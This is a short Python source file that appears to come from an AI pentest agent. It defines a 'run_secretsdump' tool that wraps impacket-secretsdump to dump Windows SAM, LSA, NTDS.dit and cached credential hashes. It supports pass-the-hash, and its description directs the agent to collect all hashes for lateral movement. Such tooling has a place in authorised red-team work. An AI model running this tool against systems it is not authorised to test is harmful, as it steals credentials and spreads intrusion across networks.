from __future__ import annotations
from typing import Any

from backend.agent.tools.base import BaseTool, ToolResult, OnOutputCallback
from backend.agent.tools import executor


class ImpacketSecretsdumpTool(BaseTool):
    name = "run_secretsdump"
    description = (
        "Run impacket-secretsdump to remotely dump password hashes from Windows SAM, LSA secrets, "
        "NTDS.dit, and cached credentials. Requires valid credentials or NTLM hash. "
        "Use after obtaining admin credentials to dump all hashes for lateral movement."
    )
    parameters = {
        "type": "object",
        "properties": {
            "target": {
                "type": "string",
                "description": "Target in format DOMAIN/user:password@ip or DOMAIN/user@ip (for hash auth)",
            },
            "hash": {
                "type": "string",
                "description": "NTLM hash for pass-the-hash e.g. aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0",
            },
            "just_dc": {
                "type": "boolean",
                "description": "Only extract NTDS.dit hashes from domain controller (faster)",
            },
        },
        "required": ["target"],
    }

    async def run(
        self,
        on_output: OnOutputCallback,
        target: str,
        hash: str | None = None,
        just_dc: bool = False,
        **_: Any,
    ) -> ToolResult:
        args = ["impacket-secretsdump"]
        if hash:
            args += ["-hashes", hash]
        if just_dc:
            args.append("-just-dc")
        args.append(target)
        return await executor.execute(self.name, args, on_output, timeout=300)
